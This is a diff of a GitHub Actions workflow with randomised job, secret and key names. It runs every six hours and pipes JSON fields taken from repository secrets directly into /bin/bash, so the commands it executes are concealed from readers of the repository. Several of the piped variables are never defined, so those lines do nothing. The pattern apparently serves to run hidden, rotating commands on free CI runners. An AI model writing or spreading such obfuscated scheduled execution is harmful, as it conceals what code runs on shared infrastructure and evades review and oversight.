@@ -1,9 +1,10 @@
 name: lonttouk
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 1/6 * * *'
-jobs:  # 15720
+    - cron: '56 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,10 +12,12 @@ jobs:  # 15720
       - uses: actions/checkout@v4
       - name: lonttouk
         env:
-          dc65537: ${{ secrets.dc65537 }}
+          mxmam179: ${{ secrets.mxmam179 }}
         run: |
-          echo $dc65537 | jq -r .tgan760 | /bin/bash
-          echo $i8 | jq -r .onkt49 | /bin/bash
-          echo $oox663 | jq -r .l0601 | /bin/bash
-          echo $gnw70059 | jq -r .usf1 | /bin/bash
+          echo $mxmam179 | jq -r .tqmhm3641 | /bin/bash
+          echo $hg06976 | jq -r .ajpy08545 | /bin/bash
+          echo $ma375 | jq -r .w0 | /bin/bash
+          echo $fzsqv33359 | jq -r .d42 | /bin/bash
+          echo $nrpx495 | jq -r .tsde1816 | /bin/bash
+          echo $c76056 | jq -r .sbgqi219 | /bin/bash
 
